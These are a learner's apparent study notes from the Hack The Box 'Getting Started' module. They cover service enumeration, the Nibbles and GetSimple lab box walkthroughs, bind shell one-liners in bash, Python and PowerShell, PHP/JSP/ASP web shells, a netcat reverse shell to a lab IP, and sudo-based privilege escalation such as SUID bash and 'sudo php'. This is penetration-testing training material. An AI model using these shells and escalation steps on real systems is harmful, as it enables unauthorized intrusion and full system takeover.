

A hypervisor is a software that allows us to create and run virtual machines


two bare metal hypervisors are Proxmox and Vmware EsXi



Staying organized is really important, when attacking a lab, box or client environment, we should have a clear folder structure on our attack machine. a sample folder structure might look like the such

```shell-session
JackTheWizard@htb[/htb]$ tree Projects/

Projects/
└── Acme Company
    ├── EPT
    │   ├── evidence
    │   │   ├── credentials
    │   │   ├── data
    │   │   └── screenshots
    │   ├── logs
    │   ├── scans
    │   ├── scope
    │   └── tools
    └── IPT
        ├── evidence
        │   ├── credentials
        │   ├── data
        │   └── screenshots
        ├── logs
        ├── scans
        ├── scope
        └── tools
```


We have two assessments here Internal Penetration test (IPT) and external penetration test (EPT). In each one we collect evidence, logs, scans, tools and scope. 


i use obsidian for note taking

Good note taking is essential. Try to from now on make seperate folders for tools, scope, logs, scans and evidence. 


There are three main types of shell connections:

|**Shell Type**|**Description**|
|---|---|
|`Reverse shell`|Initiates a connection back to a "listener" on our attack box.|
|`Bind shell`|"Binds" to a specific port on the target host and waits for a connection from our attack box.|
|`Web shell`|Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a `PHP` script to run a single command.|


for the web shell. Imagine if you get command injection on a input parameter on a webserver and you can use that to run the command cat /etc/passwd. that would be a web shell since your interacting through the shell on a web server.




A port is an address assigned to each application so that when the data arrives at the IP address the computer knows which program requested that data and which application to send that data too.

I grab the banner of the application running on 49535 with this

└──╼ [★]$ nc 94.237.54.42 49535
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1

and i see that its ssh 2.0


#### Nmap Scripts

Specifying `-sC` will run many useful default scripts against a target, but there are cases when running a specific script is required. For example, in an assessment scope, we may be asked to audit a large Citrix installation. We could use [this](https://raw.githubusercontent.com/cyberstruggle/DeltaGroup/master/CVE-2019-19781/CVE-2019-19781.nse) `Nmap` script to audit for the severe Citrix NetScaler vulnerability ([CVE-2019–19781](https://blog.rapid7.com/2020/01/17/active-exploitation-of-citrix-netscaler-cve-2019-19781-what-you-need-to-know/)), while `Nmap` also has other scripts to audit a Citrix installation.

Service Scanning

```shell-session
JackTheWizard@htb[/htb]$ locate scripts/citrix

/usr/share/nmap/scripts/citrix-brute-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps.nse
/usr/share/nmap/scripts/citrix-enum-servers-xml.nse
/usr/share/nmap/scripts/citrix-enum-servers.nse
```

The syntax for running an Nmap script is `nmap --script <script name> -p<port> <host>`.

`Nmap` scripts are a great way to enhance our scans' functionality, and inspection of the available options will pay dividends. Check out the [Network Enumeration with Nmap](https://academy.hackthebox.com/module/details/19) module for a more detailed study of the `Nmap` tool.



#### SMB

SMB (Server Message Block) is a prevalent protocol on Windows machines that provides many vectors for vertical and lateral movement. Sensitive data, including credentials, can be in network file shares, and some SMB versions may be vulnerable to RCE exploits such as [EternalBlue](https://www.avast.com/c-eternalblue). It is crucial to enumerate this sizeable potential attack surface carefully. `Nmap` has many scripts for enumerating SMB, such as [smb-os-discovery.nse](https://nmap.org/nsedoc/scripts/smb-os-discovery.html), which will interact with the SMB service to extract the reported operating system version.

Service Scanning

```shell-session
JackTheWizard@htb[/htb]$ nmap --script smb-os-discovery.nse -p445 10.10.10.40

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 00:59 GMT
Nmap scan report for doctors.htb (10.10.10.40)
Host is up (0.022s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: CEO-PC
|   NetBIOS computer name: CEO-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-12-27T00:59:46+00:00

Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds
```

In this case, the host runs a legacy Windows 7 OS, and we could conduct further enumeration to confirm if it is vulnerable to EternalBlue. The Metasploit Framework has several [modules](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/) for EternalBlue that can be used to validate the vulnerability and exploit it, as we will see in a coming section. We can run a scan against our target for this module section to gather information from the SMB service. We can ascertain that the host runs a Linux kernel, Samba version 4.6.2, and the hostname is GS-SVCSCAN.

Service Scanning

```shell-session
JackTheWizard@htb[/htb]$ nmap -A -p445 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:29 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4.6.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-25T21:30:06
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   111.62 ms 10.10.14.1
2   111.89 ms 10.129.42.253

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.72 seconds
```



#### Shares

SMB allows users and administrators to share folders and make them accessible remotely by other users. Often these shares have files in them that contain sensitive information such as passwords. A tool that can enumerate and interact with SMB shares is [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). The `-L` flag specifies that we want to retrieve a list of available shares on the remote host, while `-N` suppresses the password prompt.

Service Scanning

```shell-session
JackTheWizard@htb[/htb]$ smbclient -N -L \\\\10.129.42.253

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	users           Disk      
	IPC$            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```



WITH SMB



## SNMP (Simple network management protocol)


SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of `public` and `private` are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.

Service Scanning

```shell-session
JackTheWizard@htb[/htb]$ snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0

iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"
```

Service Scanning

```shell-session
JackTheWizard@htb[/htb]$ snmpwalk -v 2c -c private  10.129.42.253 

Timeout: No Response from 10.129.42.253
```

A tool such as [onesixtyone](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of common community strings such as the `dict.txt` file included in the GitHub repo for the tool.

Service Scanning

```shell-session
JackTheWizard@htb[/htb]$ onesixtyone -c dict.txt 10.129.42.254

Scanning 1 hosts, 51 communities
10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic #74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64
```





smbclient -L //10.129.35.124


smbclient -U bob //10.129.35.124/users





## Web enumeration


## Web Enumeration Tips

Let us walk through a few additional web enumeration tips that will help complete machines on HTB and in the real world.

#### Banner Grabbing / Web Server Headers

In the last section, we discussed banner grabbing for general purposes. Web server headers provide a good picture of what is hosted on a web server. They can reveal the specific application framework in use, the authentication options, and whether the server is missing essential security options or has been misconfigured. We can use `cURL` to retrieve server header information from the command line. `cURL` is another essential addition to our penetration testing toolkit, and familiarity with its many options is encouraged.

Web Enumeration

```shell-session
JackTheWizard@htb[/htb]$ curl -IL https://www.inlanefreight.com

HTTP/1.1 200 OK
Date: Fri, 18 Dec 2020 22:24:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Link: <https://www.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Link: <https://www.inlanefreight.com/>; rel=shortlink
Content-Type: text/html; charset=UTF-8
```

Another handy tool is [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness), which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.

#### Whatweb

We can extract the version of web servers, supporting frameworks, and applications using the command-line tool `whatweb`. This information can help us pinpoint the technologies in use and begin to search for potential vulnerabilities.


The above is REALLY useful for privilege escalation for HTB boxes as there may be vulnerably web applications running on a local host which allow you to pivot / gain privledges to different user accounts



looking at ssl certifcates can allow you to conduct phishing attacks if there is a email address

#### Robots.txt

It is common for websites to contain a `robots.txt` file, whose purpose is to instruct search engine web crawlers such as Googlebot which resources can and cannot be accessed for indexing. The `robots.txt` file can provide valuable information such as the location of private files and admin pages. In this case, we see that the `robots.txt` file contains two disallowed entries

#### Source Code

It is also worth checking the source code for any web pages we come across. We can hit `[CTRL + U]` to bring up the source code window in a browser. This example reveals a developer comment containing credentials for a test account, which could be used to log in to the website.




Find subdirectories

feroxbuster -u http://94.237.54.116:43691  -w /home/skid/pen/SecLists/Discovery/Web-Content/common.txt



this finds some sub directories. 


http://94.237.54.116:43691/robots.txt

isnide of this i find this directory

http://94.237.54.116:43691/admin-login-page.php





PORT      STATE SERVICE VERSION
39897/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.6.1
|_http-title: Getting Started &#8211; Just another WordPress site



after looking on this website i see a post about

Simple Backup Plugin 2.7.10


I do a search and find a metasploit module for this I set the option to read flag.txt and get the falg


## Bind Shell

Another type of shell is a `Bind Shell`. Unlike a `Reverse Shell` that connects to us, we will have to connect to it on the `targets'` listening port.

Once we execute a `Bind Shell Command`, it will start listening on a port on the remote host and bind that host's shell, i.e., `Bash` or `PowerShell`, to that port. We have to connect to that port with `netcat`, and we will get control through a shell on that system.

---

#### Bind Shell Command

Once again, we can utilize [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/) to find a proper command to start our bind shell.

Note: we will start a listening connection on port '1234' on the remote host, with IP '0.0.0.0' so that we can connect to it from anywhere.

The following are reliable commands we can use to start a bind shell:

Code: bash

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Code: python

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

Code: powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

#### Netcat Connection

Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it.

We can use `netcat` to connect to that port and get a connection to the shell:

Types of Shells

```shell-session
JackTheWizard@htb[/htb]$ nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Writing a Web Shell

First of all, we need to write our web shell that would take our command through a `GET` request, execute it, and print its output back. A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:

Code: php

```php
<?php system($_REQUEST["cmd"]); ?>
```

Code: jsp

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

Code: asp

```asp
<% eval request("cmd") %>
```

---

#### Uploading a Web Shell

Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. `shell.php` and upload it, and then access our uploaded file to execute commands.

However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:

|Web Server|Default Webroot|
|---|---|
|`Apache`|/var/www/html/|
|`Nginx`|/usr/local/nginx/html/|
|`IIS`|c:\inetpub\wwwroot\|
|`XAMPP`|C:\xampp\htdocs\|

We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a `PHP` shell with the following command:

Code: bash

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

---

#### Accessing Web Shell

Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:

![](https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png)

Another option is to use `cURL`:

Types of Shells

```shell-session
JackTheWizard@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, we can keep changing the command to get its output. A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on `80` or `443`, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.

On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a `Python` script to automate this process and give us a semi-interactive web shell right within our terminal.

+10 Streak pts

##### Table of Contents

###### Introduction

###### Setup

###### Pentesting Basics

###### Getting Started with Hack The Box (HTB)

###### Attacking Your First Box

###### Problem Solving

###### What's Next?

##### My Workstation

OFFLINE

0 / 1 spawns left



ssh -p 59674 user1@83.136.253.73


Priv esc:

```
user1@ng-1369176-gettingstartedprivesc-vj0gr-86c795d479-hbc9q:/home/user2$ sudo -l
Matching Defaults entries for user1 on ng-1369176-gettingstartedprivesc-vj0gr-86c795d479-hbc9q:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on ng

```

You have sudo privileges to run /bin/bash as user2 without a password! This means you can immediately escalate to user2 by running:


as user2 you are able to go into /root/.ssh and read id_rsa so you can just login as root with the ssh key


then use 

ssh -p 59674 -i key root@83.136.253.73


and login



## Using Base64

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it. For example, if we wanted to transfer a binary file called `shell`, we can `base64` encode it as follows:

Transferring Files

```shell-session
JackTheWizard@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

Now, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:

Transferring Files

```shell-session
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```


Nibbles Box:



For the first thing

i run nmap -sC -sV 

gives me the Apache[2.4.18]


when i go to the webserver it says hello world. Upon looking at the source code it says to look at a /nibbleblog/ directory


when looking up nibbleblog exploits i find this

https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/




after fuzzing 

with 


some directories stand out

http://10.129.162.207/nibbleblog/admin this has alot of exposed stuff 
http://10.129.162.207/nibbleblog/plugins/
this as well. Maybe upload a malicious plugin then execute it?

http://10.129.162.207/nibbleblog/content/private/users.xml

this seems intresting it has 
```

<users>
<user username="admin">
<id type="integer">0</id>
<session_fail_count type="integer">0</session_fail_count>
<session_date type="integer">1514544131</session_date>
</user>
<blacklist type="string" ip="10.10.10.1">
<date type="integer">1512964659</date>
<fail_count type="integer">1</fail_count>
</blacklist>
<blacklist type="string" ip="10.10.14.206">
<date type="integer">1737377132</date>
<fail_count type="integer">1</fail_count>
</blacklist>
</users>


```




after seeing that alot of this is in php I decide to search again for php file extension because i couldnt find the admin login



http://10.129.162.207/nibbleblog/admin.php

this is it 

```
 ./feroxbuster -u http://10.129.162.207/nibbleblog/  -w /home/skid/pen/SecLists/Discovery/Web-Content/raft-large-directories.txt -x php

```



After trying ALOT of credentials I just lookup the default admin credentials for nibbles which is

admin: nibbles

which works



after looking through the plugins i see the my image plugin allows stuff to be uploaded.
 So lets upload a php file 

we get some errors but if we check

http://10.129.162.207/nibbleblog/content/private/plugins/my_image/

we see that image.php is there. And we can access it which has a php command executed so lets execute reverse shell and get this

so get a reverse shell from 

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php



then change it to ur ip and port and get a shell then stablize it with

python3 -c 'import pty; pty.spawn("/bin/bash")'


you will see this makes you the user nibblerz and gives you the user flag

inside of nibbler he has a zip file. Once you unzip it there is a file named monitor.sh it has a critical line 

```
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command"

```


if you run the script with the -i flag it copies itself to /usr/bin/monitor as root. 

wait nvm i overcomplicated this

    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


Since you can run monitor.sh as root, overwrite its contents with a command to spawn a root shell:  

echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh 
echo 'chmod +s /bin/bash' >> /home/nibbler/personal/stuff/monitor.sh 
chmod +x /home/nibbler/personal/stuff/monitor.sh  

This does the following:      Sets the SUID bit on /bin/bash, allowing it to be executed as root.

now run

sudo /home/nibbler/personal/stuff/monitor.sh

then run a bash shell



/bin/bash -p


and im root




Getsimple


| ssh-hostkey: 
|   3072 4c73a025f5fe817b822b3649a54dc85e (RSA)
|   256 e1c056d052042f3cac9ae7b1792bbb13 (ECDSA)
|_  256 523147140dc38e1573e3c424a23a1277 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome to GetSimple! - gettingstarted
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



anddd admin : admin works on the admin page


after going to getting started the support page provides me with


GetSimple  3.3.15


i find this


https://github.com/cybersecaware/GetSimpleCMS-RCE

This works perfectly. I execute a reverse shell and get a user flag

*tip*
use the PoC in the script
busybox nc 10.10.14.206 9001 -e /bin/bash

python3 -c 'import pty; pty.spawn("/bin/bash")'

Vulnerable to CVE-2021-3560


Nevermind... i went down the rabbit hole so u wouldnt have to

```

Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php

```


this means u can just

CMD="/bin/sh"


sudo php -r "system('$CMD');"

